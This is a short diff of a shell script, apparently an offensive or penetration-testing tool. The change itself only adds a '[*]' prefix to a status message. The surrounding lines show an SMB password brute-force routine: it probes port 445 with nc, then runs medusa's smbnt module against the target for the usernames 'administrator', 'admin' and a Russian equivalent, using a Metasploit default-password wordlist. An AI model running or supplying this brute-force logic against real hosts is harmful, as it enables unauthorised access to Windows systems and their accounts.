@@ -4,7 +4,7 @@ WAIT=1
 DPORT=445
 
 if nc -nw $WAIT $1 $DPORT < /dev/null 2> /dev/null; then
-	echo 'bruteforcing smb'
+	echo '[*] bruteforcing smb'
 	for user in администратор administrator admin; do
 		found=$(medusa -M smbnt -m PASS:PASSWORD -h $1 -u $user -P /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt | grep SUCCESS)
 		if [ x"$found" != "x" ]; then
